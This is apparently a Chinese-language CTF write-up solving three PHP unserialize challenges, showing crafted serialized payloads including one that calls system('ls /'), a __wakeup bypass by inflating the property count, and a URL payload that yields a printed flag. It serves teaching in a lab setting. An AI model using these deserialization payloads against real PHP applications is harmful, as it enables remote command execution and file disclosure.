**再用`ls` 查看根目录 ，一般的flag都在根目录下。通过命令我们查到了flag**

**`nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}`**

![image-20231101164011093](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101164011093.webp) 

**接下来我们再用 `cat` 来打开这个flag   得到我们想要的**  

![image-20231101165224169](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101165224169.webp) 



#### 再来一题

**题目：**

```php
<?php
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);				//  这个函数就是一个高亮函数，通俗就是让这代码显示到次页面来
        //flag is in fllllllag.php				// 这里告诉我们flag在这个php文件中
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);
} else {
    highlight_file(__FILE__);
}
```

**题目的意思就是说我们要把`fllllllag.php` 放到  这里` ($this->x);` 也就是说让这个``X`等于它 。但是这里有个坑就是 ` __wakeup()`这个魔术方法就是当我们执行反序列化操作的时候，不管给什么值就是X 永远等于file`$this->x = __FILE__;`**

**这里解释一下` __wakeup()` 这个函数。如果对象的魔法函数中存在的``__wakeup方法``，那么之后再调用 `unserilize() 方法`进行反序列化之前则会先调用``__wakeup方法``，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过``__wakeup`的执行。**

#### 以下写一个php反序列化

```php
<?php
highlight_file(__FILE__);
class X
{
    public $x = 'fllllllag.php';
}
    echo serialize(new X);
?>
```

**执行一下这个文件，得到一串被反序列化后的值 `O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}`**

![image-20231102091626465](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102091626465.webp) 

```php
0 ：表示对象
1 ：表示对象名称的长度
X ：表示对象的名称
1 ：表示对象里的属性的个数
s :属性名类型
1 :属性名长度
x :属性的名称
s :属性值的类型
13 :属性值的长度
```

**得到flag ，这里的 `_wakeup函数`就强制对 ` X `属性进行更改，要得到flag就必须绕过 ``_wakeup函数`，一般做ctf绕过的时候我们都会先序列化字符串，然后使序列化后字符串中属性的个数大于真实对象中属性的个数，即可绕过。然后将序列化后字符串中属性的个数由1改为3，大于真实属性个数1，即可绕过`__wakeup`**

![image-20231102092001275](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102092001275.webp) 



#### 再来一题

**题目：[SWPUCTF 2021 新生赛ez_unserialize ](https://www.ctfer.vip/problem/426)**  **看到这种题目没什么小提示 那就直接看源代码**

![image-20231102094534133](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102094534133.webp) 



**在源代码页面发现好东西  `disallow`也就是``Robots 协议``（也称为爬虫协议、爬虫规则、机器人协议等）的全称是 “网络爬虫排除标准”（Robots Exclusion Protocol），是指网站可建立一个``robots.txt文件``来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取``robots.txt文件``来识别这个页面是否允许被抓取。 但是,这个``robots协议``不是防火墙,也没有强制执行力,搜索引擎完全可以忽视``robots.txt文件``去抓取网页的快照。**

![image-20231102094738954](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102094738954.webp) 



**从``robots.txt`文件中得知存在/cl45s.php，遂进入该目录下打开该文件**

![image-20231102095417463](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102095417463.webp) 

**获得代码，接下来就是 php代码审计**

![image-20231102102951288](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102102951288.webp) 

**相关解释**

```php
<?php
 
error_reporting(0);      					#通过error_reporting屏蔽报错
show_source("cl45s.php"); 					#将c145s.php的代码显示到页面上
 
class wllm{               					#定义了一个wllm类
 
    public $admin;      				 	#公共变量admin
    public $passwd;       					#公共变量passwd
 
    public function __construct(){		 	 #construct当类创建时调用
        $this->admin ="user";    			 #指定admin的值为user
        $this->passwd = "123456";			 #指定passwd的值为123456
    }
 
        public function __destruct(){ 		#destruct当对象要销毁时调用
        
        if($this->admin === "admin" && $this->passwd === "ctf"){  
 #if判断 admin的值是不是admin passwd的值是不是ctf
            
            include("flag.php"); 			 #include包含flag 当if判断成立时执行
            echo $flag;          			 #输出flag     
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}
 
$p = $_GET['p'];   							#get方法获取p并赋值
unserialize($p);   							#对p进行反序列化
?>

```

 **接下来就可以简单构造一下反序列化**

```
<?php
class wllm{
        public $admin="admin";
        public $passwd="ctf";
    }
    echo serialize(new wllm());
?>
```

**得到一个被反序列化后的值   **

```
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

**再把这个值拼接到url上**

```
http://node5.anna.nssctf.cn:28965/cl45s.php?
p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;}
```

**得到flag  `NSSCTF{9464157d-b346-447e-a4c3-9ad6395f71d5}`**

![image-20231102114430253](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102114430253.webp) 
